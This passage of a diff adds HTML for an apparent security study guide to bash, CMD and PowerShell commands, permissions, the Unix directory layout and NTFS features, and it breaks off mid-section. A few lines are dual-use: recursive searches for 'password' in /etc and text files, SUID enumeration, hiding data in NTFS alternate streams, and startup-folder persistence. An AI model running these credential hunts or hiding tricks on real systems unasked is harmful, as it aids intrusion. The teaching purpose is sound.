+        <span class="code-line"><span class="cmd">cmd</span> &amp;&gt; <span class="path">file</span>      <span class="comment"># bash shorthand: both to file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &lt; <span class="path">file</span>       <span class="comment"># stdin from file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &lt;&lt; <span class="val">EOF</span>      <span class="comment"># here-doc: inline stdin until EOF</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &lt;&lt;&lt; <span class="val">"str"</span>   <span class="comment"># here-string: string as stdin</span></span>
+        <span class="code-line"><span class="cmd">cmd1</span> | <span class="cmd">cmd2</span>     <span class="comment"># pipe stdout → stdin</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> | <span class="cmd">tee</span> <span class="path">file</span>  <span class="comment"># pipe AND write to file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="path">/dev/null</span>  <span class="comment"># discard output</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Windows CMD</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="path">file.txt</span>     <span class="comment"># stdout to file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &gt;&gt; <span class="path">file.txt</span>    <span class="comment"># append</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> 2&gt; <span class="path">err.txt</span>   <span class="comment"># stderr to file</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> 2&gt;&amp;1         <span class="comment"># merge stderr → stdout</span></span>
+        <span class="code-line"><span class="cmd">cmd1</span> | <span class="cmd">cmd2</span>     <span class="comment"># pipe</span></span>
+        <span class="code-line"><span class="cmd">cmd</span> &gt; <span class="val">NUL</span>        <span class="comment"># discard (NUL = /dev/null)</span></span>
+        <span class="code-line"><span class="cmd">type</span> <span class="path">file</span> | <span class="cmd">more</span> <span class="comment"># paginate output</span></span>
+        <span class="code-line"><span class="comment"># FD numbers: 1=stdout 2=stderr</span></span>
+        <span class="code-line"><span class="comment"># No &lt;&lt; heredoc in cmd.exe</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>Variables, Quoting & Substitution</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># ── Variable assignment ─────────────────────────────────────</span></span>
+    <span class="code-line"><span class="cmd">NAME</span>=<span class="val">"Alice"</span>            <span class="comment"># No spaces around =</span></span>
+    <span class="code-line"><span class="cmd">readonly</span> <span class="val">CONST</span>=<span class="val">42</span>       <span class="comment"># Immutable variable</span></span>
+    <span class="code-line"><span class="cmd">export</span> <span class="val">PATH</span>             <span class="comment"># Make visible to child processes</span></span>
+    <span class="code-line"><span class="cmd">unset</span> <span class="val">NAME</span>              <span class="comment"># Delete variable</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Quoting rules ───────────────────────────────────────────</span></span>
+    <span class="code-line"><span class="val">"double"</span>               <span class="comment"># Expands $VAR, `cmd`, \escapes</span></span>
+    <span class="code-line"><span class="val">'single'</span>               <span class="comment"># LITERAL — no expansion at all</span></span>
+    <span class="code-line"><span class="val">$'escape'</span>              <span class="comment"># C-style escapes: \n \t \x41</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Parameter expansion ─────────────────────────────────────</span></span>
+    <span class="code-line"><span class="val">${VAR}</span>                 <span class="comment"># Basic; use braces to disambiguate</span></span>
+    <span class="code-line"><span class="val">${VAR:-default}</span>        <span class="comment"># Use default if VAR unset or empty</span></span>
+    <span class="code-line"><span class="val">${VAR:=default}</span>        <span class="comment"># Set AND use default if unset</span></span>
+    <span class="code-line"><span class="val">${#VAR}</span>                <span class="comment"># Length of VAR</span></span>
+    <span class="code-line"><span class="val">${VAR:2:5}</span>             <span class="comment"># Substring: offset 2, length 5</span></span>
+    <span class="code-line"><span class="val">${VAR//old/new}</span>        <span class="comment"># Replace all occurrences</span></span>
+    <span class="code-line"><span class="val">${VAR#prefix}</span>          <span class="comment"># Strip shortest prefix match</span></span>
+    <span class="code-line"><span class="val">${VAR%suffix}</span>          <span class="comment"># Strip shortest suffix match</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Command substitution ────────────────────────────────────</span></span>
+    <span class="code-line"><span class="val">NOW</span>=$(<span class="cmd">date +%Y%m%d</span>)    <span class="comment"># Preferred syntax</span></span>
+    <span class="code-line"><span class="val">NOW</span>=`<span class="cmd">date +%Y%m%d</span>`    <span class="comment"># Legacy backtick (nesting is ugly)</span></span>
+  </div>
+
+  <h3>Operators & Conditionals</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># ── Test operators ─────────────────────</span></span>
+    <span class="code-line"><span class="flag">[ $X -eq 5 ]</span>     <span class="comment"># Integer: -eq -ne -lt -le -gt -ge</span></span>
+    <span class="code-line"><span class="flag">[ "$S" = "yes" ]</span> <span class="comment"># String equal (always quote strings)</span></span>
+    <span class="code-line"><span class="flag">[ -z "$S" ]</span>      <span class="comment"># True if S is empty</span></span>
+    <span class="code-line"><span class="flag">[ -n "$S" ]</span>      <span class="comment"># True if S is non-empty</span></span>
+    <span class="code-line"><span class="flag">[ -f file ]</span>      <span class="comment"># True if file exists and is regular file</span></span>
+    <span class="code-line"><span class="flag">[ -d dir ]</span>       <span class="comment"># True if directory exists</span></span>
+    <span class="code-line"><span class="flag">[ -x file ]</span>      <span class="comment"># True if file is executable</span></span>
+    <span class="code-line"><span class="flag">[ -r file ]</span>      <span class="comment"># True if readable</span></span>
+    <span class="code-line"><span class="flag">[[ ]]</span>            <span class="comment"># Bash extended test: supports &&, ||, =~</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Logical operators ─────────────────</span></span>
+    <span class="code-line"><span class="cmd">cmd1</span> &amp;&amp; <span class="cmd">cmd2</span>    <span class="comment"># cmd2 runs ONLY if cmd1 succeeds (exit 0)</span></span>
+    <span class="code-line"><span class="cmd">cmd1</span> || <span class="cmd">cmd2</span>    <span class="comment"># cmd2 runs ONLY if cmd1 fails</span></span>
+    <span class="code-line"><span class="cmd">cmd1</span> ; <span class="cmd">cmd2</span>     <span class="comment"># Always run both sequentially</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># ── Arithmetic ────────────────────────</span></span>
+    <span class="code-line"><span class="val">result</span>=$(( 5 * 3 + 2 ))  <span class="comment"># = 17</span></span>
+    <span class="code-line">(( i++ ))                <span class="comment"># Increment; no $ needed inside</span></span>
+  </div>
+
+  <h3>Control Flow</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">If / For / While</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="flag">if</span> [ -f <span class="path">/etc/passwd</span> ]; <span class="flag">then</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">"exists"</span></span>
+        <span class="code-line"><span class="flag">elif</span> [ -d <span class="path">/etc</span> ]; <span class="flag">then</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">"dir"</span></span>
+        <span class="code-line"><span class="flag">else</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">"neither"</span></span>
+        <span class="code-line"><span class="flag">fi</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="flag">for</span> <span class="val">i</span> <span class="flag">in</span> 1 2 3; <span class="flag">do</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">$i</span></span>
+        <span class="code-line"><span class="flag">done</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="flag">while</span> <span class="val">read</span> line; <span class="flag">do</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">"$line"</span></span>
+        <span class="code-line"><span class="flag">done</span> &lt; <span class="path">input.txt</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">Case / Functions</div>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="flag">case</span> <span class="val">"$1"</span> <span class="flag">in</span></span>
+        <span class="code-line">  <span class="val">start</span>)  <span class="cmd">echo</span> <span class="val">"Starting"</span> ;;</span>
+        <span class="code-line">  <span class="val">stop</span>)   <span class="cmd">echo</span> <span class="val">"Stopping"</span> ;;</span>
+        <span class="code-line">  <span class="val">*</span>)      <span class="cmd">echo</span> <span class="val">"Unknown"</span>  ;;</span>
+        <span class="code-line"><span class="flag">esac</span></span>
+        <span class="code-line"></span>
+        <span class="code-line"><span class="cmd">greet</span>() {</span>
+        <span class="code-line">  <span class="val">local</span> name=<span class="val">"$1"</span>  <span class="comment"># local scope</span></span>
+        <span class="code-line">  <span class="cmd">echo</span> <span class="val">"Hello $name"</span></span>
+        <span class="code-line">  <span class="flag">return</span> 0          <span class="comment"># exit code</span></span>
+        <span class="code-line">}</span>
+        <span class="code-line"><span class="cmd">greet</span> <span class="val">"World"</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>Process Control</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">cmd</span> &amp;              <span class="comment"># Background job</span></span>
+    <span class="code-line"><span class="cmd">jobs</span> -l           <span class="comment"># List jobs with PIDs</span></span>
+    <span class="code-line"><span class="cmd">fg %1</span>             <span class="comment"># Foreground job 1</span></span>
+    <span class="code-line"><span class="cmd">bg %1</span>             <span class="comment"># Resume stopped job in background</span></span>
+    <span class="code-line">Ctrl+Z            <span class="comment"># Suspend current foreground process (SIGTSTP)</span></span>
+    <span class="code-line">Ctrl+C            <span class="comment"># Interrupt (SIGINT)</span></span>
+    <span class="code-line">Ctrl+D            <span class="comment"># EOF (close stdin, logout from shell)</span></span>
+    <span class="code-line"><span class="cmd">kill</span> <span class="flag">-l</span>           <span class="comment"># List all signal names</span></span>
+    <span class="code-line"><span class="cmd">kill</span> <span class="flag">-1</span>  <span class="val">PID</span>     <span class="comment"># SIGHUP: reload config (daemons)</span></span>
+    <span class="code-line"><span class="cmd">kill</span> <span class="flag">-2</span>  <span class="val">PID</span>     <span class="comment"># SIGINT: like Ctrl+C</span></span>
+    <span class="code-line"><span class="cmd">kill</span> <span class="flag">-9</span>  <span class="val">PID</span>     <span class="comment"># SIGKILL: cannot be caught/ignored</span></span>
+    <span class="code-line"><span class="cmd">kill</span> <span class="flag">-15</span> <span class="val">PID</span>     <span class="comment"># SIGTERM: graceful terminate (default)</span></span>
+    <span class="code-line"><span class="cmd">killall</span> <span class="val">firefox</span>  <span class="comment"># Kill by name</span></span>
+    <span class="code-line"><span class="cmd">nohup cmd</span> &amp;      <span class="comment"># Run immune to SIGHUP (survives logout)</span></span>
+    <span class="code-line"><span class="cmd">disown %1</span>        <span class="comment"># Remove job from shell job table</span></span>
+  </div>
+
+  <h3>Shell Expansion Types (in order of evaluation)</h3>
+  <ul class="bullets">
+    <li><strong>Brace expansion</strong>: <code>cp file{.bak,.orig}</code> → <code>cp file.bak file.orig</code>. Not POSIX, bash-specific.</li>
+    <li><strong>Tilde expansion</strong>: <code>~</code> → $HOME, <code>~user</code> → that user's home, <code>~-</code> → previous directory ($OLDPWD)</li>
+    <li><strong>Parameter expansion</strong>: <code>${VAR}</code>, with modifiers like <code>${VAR:-default}</code></li>
+    <li><strong>Command substitution</strong>: <code>$(cmd)</code> or <code>`cmd`</code> — output replaces expression</li>
+    <li><strong>Arithmetic expansion</strong>: <code>$((expr))</code> — integer arithmetic only</li>
+    <li><strong>Word splitting</strong>: unquoted expansions split on IFS characters (space/tab/newline). Always quote <code>"$VAR"</code> to prevent.</li>
+    <li><strong>Pathname (glob) expansion</strong>: <code>*</code>=any chars, <code>?</code>=one char, <code>[abc]</code>=character class, <code>[!abc]</code>=negation</li>
+    <li><strong>Process substitution</strong>: <code>&lt;(cmd)</code> and <code>&gt;(cmd)</code> — treat command I/O as a file (bash/zsh only)</li>
+  </ul>
+
+  <h3>Getting Help with Commands</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">man</span> <span class="val">5 passwd</span>       <span class="comment"># Section 5 = file formats; 1=cmds 2=syscalls 3=lib 8=admin</span></span>
+    <span class="code-line"><span class="cmd">man</span> <span class="flag">-k</span> <span class="val">socket</span>      <span class="comment"># Search man page descriptions (= apropos)</span></span>
+    <span class="code-line"><span class="cmd">info</span> <span class="val">coreutils</span>    <span class="comment"># GNU info system (more verbose than man)</span></span>
+    <span class="code-line"><span class="cmd">command</span> <span class="flag">--help</span>     <span class="comment"># Quick flag reference</span></span>
+    <span class="code-line"><span class="cmd">type</span> <span class="val">ls</span>            <span class="comment"># Is it alias, function, built-in, or file?</span></span>
+    <span class="code-line"><span class="cmd">which</span> <span class="val">python3</span>      <span class="comment"># Full path of executable (searches PATH)</span></span>
+    <span class="code-line"><span class="cmd">help</span> <span class="val">cd</span>            <span class="comment"># bash built-in help (only for built-ins)</span></span>
+    <span class="code-line"><span class="comment"># Windows:</span></span>
+    <span class="code-line"><span class="cmd">cmd</span> <span class="flag">/?</span>             <span class="comment"># Help for any CMD command (also: help cmd)</span></span>
+    <span class="code-line"><span class="cmd">Get-Help</span> <span class="val">cmdlet</span> <span class="flag">-Examples</span>  <span class="comment"># PowerShell with real examples</span></span>
+    <span class="code-line"><span class="cmd">Get-Command</span> <span class="flag">-Verb</span> <span class="val">Get</span>      <span class="comment"># List all Get-* cmdlets</span></span>
+  </div>
+</div>
+
+<!-- ============================================================ UNIX FILESYSTEM -->
+<div class="section" id="fs-unix">
+  <div class="section-header">
+    <div class="section-icon">🐧</div>
+    <div><div class="section-title">Unix Filesystem Navigation</div><div class="section-meta">FHS · permissions · links · searching · output redirection</div></div>
+  </div>
+
+  <h3>Filesystem Hierarchy Standard (FHS)</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Path</th><th>Purpose</th><th>Security Note</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">/</td><td>Root — everything is under here</td><td>Only root should own; never world-writable</td></tr>
+      <tr><td class="cmd-name">/bin</td><td>Essential user binaries (ls, cp, cat, bash)</td><td>Critical for system boot; often read-only mount</td></tr>
+      <tr><td class="cmd-name">/sbin</td><td>System admin binaries (fsck, ifconfig, init)</td><td>Generally requires root to execute</td></tr>
+      <tr><td class="cmd-name">/etc</td><td>System-wide configuration files</td><td>Contains passwords, keys, service configs — restrict read access</td></tr>
+      <tr><td class="cmd-name">/var</td><td>Variable data: logs, spools, caches, mail</td><td>/var/log is prime audit source; /var/tmp persists reboots</td></tr>
+      <tr><td class="cmd-name">/tmp</td><td>Temporary files; world-writable with sticky bit</td><td>Sticky bit (1777) prevents other users deleting your files</td></tr>
+      <tr><td class="cmd-name">/home</td><td>User home directories (~)</td><td>Should be separate partition so disk-full doesn't crash system</td></tr>
+      <tr><td class="cmd-name">/root</td><td>Root user's home directory</td><td>Separate from /home; accessible only by root</td></tr>
+      <tr><td class="cmd-name">/proc</td><td>Virtual FS — kernel/process info in file form</td><td>/proc/PID/exe → symlink to binary; /proc/net/tcp for connections</td></tr>
+      <tr><td class="cmd-name">/sys</td><td>Virtual FS — hardware/kernel tunables</td><td>Modern replacement for some /proc uses</td></tr>
+      <tr><td class="cmd-name">/dev</td><td>Device files (block: /dev/sda; char: /dev/tty)</td><td>/dev/null discards; /dev/zero infinite zeros; /dev/urandom random bytes</td></tr>
+      <tr><td class="cmd-name">/usr</td><td>User programs, libs, man pages, share data</td><td>Often read-only mounted; /usr/local for admin-installed software</td></tr>
+      <tr><td class="cmd-name">/opt</td><td>Optional/third-party software packages</td><td>Self-contained app trees</td></tr>
+      <tr><td class="cmd-name">/boot</td><td>Kernel, initrd, GRUB bootloader</td><td>Separate partition; keep small; critical for system start</td></tr>
+      <tr><td class="cmd-name">/mnt /media</td><td>Mount points for temporary/removable media</td><td>/media for auto-mounted; /mnt for manual</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>Navigation & File Operations</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">pwd</span>                           <span class="comment"># Print working directory</span></span>
+    <span class="code-line"><span class="cmd">cd</span> <span class="flag">-</span>                         <span class="comment"># Go back to previous directory ($OLDPWD)</span></span>
+    <span class="code-line"><span class="cmd">ls</span> <span class="flag">-lahS</span>                      <span class="comment"># long, all, human-size, sort by Size</span></span>
+    <span class="code-line"><span class="cmd">ls</span> <span class="flag">-latr</span>                      <span class="comment"># sort by Time, Reversed (oldest first)</span></span>
+    <span class="code-line"><span class="cmd">cp</span> <span class="flag">-rp</span> <span class="path">src/ dst/</span>             <span class="comment"># Copy recursive, preserve permissions+timestamps</span></span>
+    <span class="code-line"><span class="cmd">mv</span> <span class="path">old</span> <span class="path">new</span>                    <span class="comment"># Move or rename (atomic on same fs)</span></span>
+    <span class="code-line"><span class="cmd">rm</span> <span class="flag">-rf</span> <span class="path">dir/</span>                   <span class="comment"># DANGER: recursive force delete</span></span>
+    <span class="code-line"><span class="cmd">mkdir</span> <span class="flag">-p</span> <span class="path">a/b/c</span>               <span class="comment"># Create with parents</span></span>
+    <span class="code-line"><span class="cmd">touch</span> <span class="path">file</span>                    <span class="comment"># Create empty or update timestamps</span></span>
+    <span class="code-line"><span class="cmd">stat</span> <span class="path">file</span>                     <span class="comment"># Full inode info: size, permissions, atime/mtime/ctime</span></span>
+    <span class="code-line"><span class="cmd">file</span> <span class="path">binary</span>                   <span class="comment"># Detect type by magic bytes (not extension)</span></span>
+    <span class="code-line"><span class="cmd">wc</span> <span class="flag">-l</span> <span class="path">file</span>                    <span class="comment"># Count lines; -w words; -c bytes</span></span>
+    <span class="code-line"><span class="cmd">diff</span> <span class="flag">-u</span> <span class="path">file1 file2</span>          <span class="comment"># Unified diff; negative lines=old positive=new</span></span>
+  </div>
+
+  <h3>File Permissions Deep Dive</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># Symbolic: [type][owner][group][other]</span></span>
+    <span class="code-line"><span class="val">-rwxr-xr--</span>   <span class="comment"># file; owner=rwx; group=r-x; other=r--</span></span>
+    <span class="code-line"><span class="val">drwxrwxrwt</span>   <span class="comment"># dir; sticky bit (t) = only owner can delete entries</span></span>
+    <span class="code-line"><span class="val">-rwsr-xr-x</span>   <span class="comment"># SUID (s in owner exec) = runs as file owner (e.g., /usr/bin/passwd)</span></span>
+    <span class="code-line"><span class="val">-rwxr-sr-x</span>   <span class="comment"># SGID (s in group exec) = runs as group</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Octal: 4=r 2=w 1=x</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="val">755</span> <span class="path">file</span>   <span class="comment"># rwxr-xr-x  — executables</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="val">644</span> <span class="path">file</span>   <span class="comment"># rw-r--r--  — config/data files</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="val">600</span> <span class="path">file</span>   <span class="comment"># rw-------  — private keys, sensitive files</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="val">4755</span> <span class="path">file</span>  <span class="comment"># SUID + 755 (high risk if abusable)</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="flag">+x</span> <span class="path">script</span> <span class="comment"># Add execute for all (symbolic)</span></span>
+    <span class="code-line"><span class="cmd">chmod</span> <span class="flag">o-w</span> <span class="path">file</span>  <span class="comment"># Remove write from other</span></span>
+    <span class="code-line"><span class="cmd">umask</span> <span class="val">022</span>       <span class="comment"># Default permission mask: files=644, dirs=755</span></span>
+    <span class="code-line"><span class="cmd">chown</span> <span class="val">user:grp</span> <span class="path">f</span> <span class="comment"># Change owner and group</span></span>
+    <span class="code-line"><span class="cmd">chown</span> <span class="flag">-R</span> <span class="val">www-data</span> <span class="path">/var/www</span>  <span class="comment"># Recursive ownership change</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># Find SUID binaries (security audit)</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">/</span> <span class="flag">-perm</span> <span class="val">-4000</span> <span class="flag">-type f</span> 2&gt;/dev/null</span>
+  </div>
+
+  <h3>Hard Links vs Symbolic Links</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Hard Links</div>
+      <p>Another directory entry pointing to the same inode (same physical data). Deleting the original doesn't remove data until all hard links are gone (link count = 0). Cannot cross filesystems. Cannot link directories. <code>ls -li</code> shows same inode number.</p>
+      <div class="code-block no-prompt"><span class="code-line"><span class="cmd">ln</span> <span class="path">file hardlink</span>   <span class="comment"># Creates hard link</span></span></div>
+    </div>
+    <div class="card">
+      <div class="card-title">Symbolic (Soft) Links</div>
+      <p>A special file containing a path string pointing to another file/dir. Can cross filesystems and link to directories. If target is deleted, symlink becomes a <em>dangling link</em>. Symlinks have their own inode but no independent data.</p>
+      <div class="code-block no-prompt"><span class="code-line"><span class="cmd">ln</span> <span class="flag">-s</span> <span class="path">/target /link</span>  <span class="comment"># Creates symlink</span></span><span class="code-line"><span class="cmd">readlink</span> <span class="flag">-f</span> <span class="path">link</span>    <span class="comment"># Resolve to absolute path</span></span></div>
+    </div>
+  </div>
+
+  <h3>Searching the Filesystem</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="comment"># find — recursive search with actions</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">/var/log</span> <span class="flag">-name</span> <span class="val">"*.log"</span> <span class="flag">-mtime -7</span>       <span class="comment"># Modified in last 7 days</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">/</span> <span class="flag">-user</span> <span class="val">root</span> <span class="flag">-perm -4000</span>              <span class="comment"># SUID root files</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">.</span> <span class="flag">-size</span> <span class="val">+100M</span>                          <span class="comment"># Files over 100MB</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">/tmp</span> <span class="flag">-type f -newer</span> <span class="path">/etc/passwd</span>       <span class="comment"># Newer than reference file</span></span>
+    <span class="code-line"><span class="cmd">find</span> <span class="path">.</span> <span class="flag">-exec</span> <span class="cmd">chmod</span> <span class="val">644</span> {} \;               <span class="comment"># Execute command on each result</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># grep — content search</span></span>
+    <span class="code-line"><span class="cmd">grep</span> <span class="flag">-rn</span> <span class="val">"password"</span> <span class="path">/etc/</span>               <span class="comment"># Recursive, show line numbers</span></span>
+    <span class="code-line"><span class="cmd">grep</span> <span class="flag">-i</span> <span class="val">"error"</span> <span class="path">/var/log/syslog</span>          <span class="comment"># Case-insensitive</span></span>
+    <span class="code-line"><span class="cmd">grep</span> <span class="flag">-v</span> <span class="val">"^#"</span> <span class="path">/etc/ssh/sshd_config</span>       <span class="comment"># Invert: exclude comment lines</span></span>
+    <span class="code-line"><span class="cmd">grep</span> <span class="flag">-E</span> <span class="val">"[0-9]{1,3}\.[0-9]{1,3}"</span>         <span class="comment"># Extended regex (ERE)</span></span>
+    <span class="code-line"></span>
+    <span class="code-line"><span class="comment"># locate (uses database — faster but not real-time)</span></span>
+    <span class="code-line"><span class="cmd">updatedb</span> &amp;&amp; <span class="cmd">locate</span> <span class="val">sshd_config</span></span>
+  </div>
+</div>
+
+<!-- ============================================================ WINDOWS FILESYSTEM -->
+<div class="section" id="fs-win">
+  <div class="section-header">
+    <div class="section-icon">🪟</div>
+    <div><div class="section-title">Windows Filesystem Navigation</div><div class="section-meta">cmd.exe · PowerShell · NTFS features · key paths · ACLs</div></div>
+  </div>
+
+  <h3>Key System Directory Paths</h3>
+  <div style="overflow-x:auto;-webkit-overflow-scrolling:touch;"><table class="cmd-table">
+    <thead><tr><th>Path</th><th>Contents & Notes</th></tr></thead>
+    <tbody>
+      <tr><td class="cmd-name">C:\Windows\System32</td><td>Core 64-bit system executables and DLLs. cmd.exe, notepad.exe, svchost.exe, ntdll.dll</td></tr>
+      <tr><td class="cmd-name">C:\Windows\SysWOW64</td><td>32-bit binaries on 64-bit Windows (WOW64 subsystem). Confusingly named — WOW64 = Windows on Windows 64</td></tr>
+      <tr><td class="cmd-name">C:\Windows\Temp</td><td>System temp files. Malware commonly drops here. Monitor for new executables</td></tr>
+      <tr><td class="cmd-name">C:\Windows\Prefetch</td><td>.pf files. Forensic artifact: evidence of program execution even if binary deleted</td></tr>
+      <tr><td class="cmd-name">C:\Users\&lt;user&gt;\AppData\Local</td><td>Per-user local app data; not roamed in domains. %LOCALAPPDATA%</td></tr>
+      <tr><td class="cmd-name">C:\Users\&lt;user&gt;\AppData\Roaming</td><td>Roaming profile data; synced in domain. %APPDATA%. Startup folder here</td></tr>
+      <tr><td class="cmd-name">C:\ProgramData</td><td>Machine-wide app data (all users). Hidden by default. Was "All Users\Application Data"</td></tr>
+      <tr><td class="cmd-name">C:\Program Files</td><td>64-bit applications. Requires admin to write. %ProgramFiles%</td></tr>
+      <tr><td class="cmd-name">C:\Program Files (x86)</td><td>32-bit applications on 64-bit Windows</td></tr>
+      <tr><td class="cmd-name">C:\Windows\System32\drivers\etc</td><td>hosts, lmhosts, networks, protocol, services files (unix equivalents)</td></tr>
+      <tr><td class="cmd-name">C:\Windows\System32\winevt\Logs</td><td>.evtx log files: Security.evtx, System.evtx, Application.evtx</td></tr>
+      <tr><td class="cmd-name">%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</td><td>Per-user startup folder (persistence mechanism)</td></tr>
+    </tbody>
+  </table></div>
+
+  <h3>CMD Navigation & File Operations</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">cd</span> <span class="path">C:\Windows\System32</span>  <span class="comment"># Absolute path</span></span>
+    <span class="code-line"><span class="cmd">cd</span> <span class="path">..\sibling</span>          <span class="comment"># Relative path</span></span>
+    <span class="code-line"><span class="cmd">cd</span> <span class="path">/d D:\folder</span>       <span class="comment"># /d to change drive letter</span></span>
+    <span class="code-line"><span class="cmd">dir</span> <span class="flag">/a:h /s</span>           <span class="comment"># /a:h = hidden files; /s = subdirectories</span></span>
+    <span class="code-line"><span class="cmd">dir</span> <span class="flag">/o:d</span>              <span class="comment"># Sort by date (oldest first)</span></span>
+    <span class="code-line"><span class="cmd">copy</span> <span class="path">src.txt dst.txt</span>  <span class="comment"># Copy single file</span></span>
+    <span class="code-line"><span class="cmd">xcopy</span> <span class="path">src\ dst\</span> <span class="flag">/e /h /k</span>  <span class="comment"># Recursive copy with empty dirs and hidden files</span></span>
+    <span class="code-line"><span class="cmd">robocopy</span> <span class="path">src dst</span> <span class="flag">/mir</span>     <span class="comment"># Mirror (sync); preserves ACLs, timestamps</span></span>
+    <span class="code-line"><span class="cmd">move</span> <span class="path">old.txt new.txt</span>  <span class="comment"># Move/rename</span></span>
+    <span class="code-line"><span class="cmd">del</span> <span class="flag">/f /q</span> <span class="path">file.txt</span>    <span class="comment"># Force delete, no prompt</span></span>
+    <span class="code-line"><span class="cmd">rmdir</span> <span class="flag">/s /q</span> <span class="path">folder</span>   <span class="comment"># Delete directory tree silently</span></span>
+    <span class="code-line"><span class="cmd">type</span> <span class="path">file.txt</span>         <span class="comment"># Print file (like cat)</span></span>
+    <span class="code-line"><span class="cmd">more</span> <span class="path">file.txt</span>         <span class="comment"># Paginated view</span></span>
+    <span class="code-line"><span class="cmd">attrib</span> <span class="flag">+h +s</span> <span class="path">file</span>    <span class="comment"># Set hidden (+h) and system (+s) attributes</span></span>
+    <span class="code-line"><span class="cmd">where</span> <span class="val">python.exe</span>     <span class="comment"># Find executable in PATH (like which)</span></span>
+    <span class="code-line"><span class="cmd">findstr</span> <span class="flag">/s /i</span> <span class="val">"password"</span> <span class="path">*.txt</span>  <span class="comment"># Recursive case-insensitive grep</span></span>
+    <span class="code-line"><span class="cmd">assoc .txt</span>            <span class="comment"># Show file association (extension → prog ID)</span></span>
+  </div>
+
+  <h3>NTFS-Specific Features</h3>
+  <div class="two-col">
+    <div class="card">
+      <div class="card-title">Alternate Data Streams (ADS)</div>
+      <p>NTFS allows multiple data streams per file. Main content is in the default stream (<code>file.txt</code>); additional streams are <code>file.txt:streamname</code>. Used legitimately (Zone.Identifier marks downloaded files) and by malware to hide data. Normal <code>dir</code> doesn't show ADS.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">echo</span> <span class="val">hidden</span> &gt; <span class="path">file.txt:secret</span></span>
+        <span class="code-line"><span class="cmd">dir</span> <span class="flag">/r</span>         <span class="comment"># Shows ADS streams</span></span>
+        <span class="code-line"><span class="cmd">more</span> &lt; <span class="path">file.txt:secret</span></span>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-title">NTFS Permissions (ACLs)</div>
+      <p>Fine-grained ACLs per file/folder. Permissions: Full Control, Modify, Read &amp; Execute, Read, Write, List Folder Contents. Explicit Deny overrides Allow. Effective permissions = union of all group memberships.</p>
+      <div class="code-block no-prompt">
+        <span class="code-line"><span class="cmd">icacls</span> <span class="path">C:\folder</span>            <span class="comment"># Show ACL</span></span>
+        <span class="code-line"><span class="cmd">icacls</span> <span class="path">file</span> <span class="flag">/grant</span> <span class="val">User:(R)</span></span>
+        <span class="code-line"><span class="cmd">icacls</span> <span class="path">file</span> <span class="flag">/deny</span>  <span class="val">User:(W)</span></span>
+        <span class="code-line"><span class="cmd">cacls</span>   <span class="comment"># Legacy; use icacls instead</span></span>
+      </div>
+    </div>
+  </div>
+
+  <h3>PowerShell File Operations</h3>
+  <div class="code-block no-prompt">
+    <span class="code-line"><span class="cmd">Get-ChildItem</span> <span class="flag">-Recurse -Hidden</span> <span class="path">C:\</span>       <span class="comment"># ls -la equivalent</span></span>
+    <span class="code-line"><span class="cmd">Copy-Item</span> <span class="path">src dst</span> <span class="flag">-Recurse</span></span>
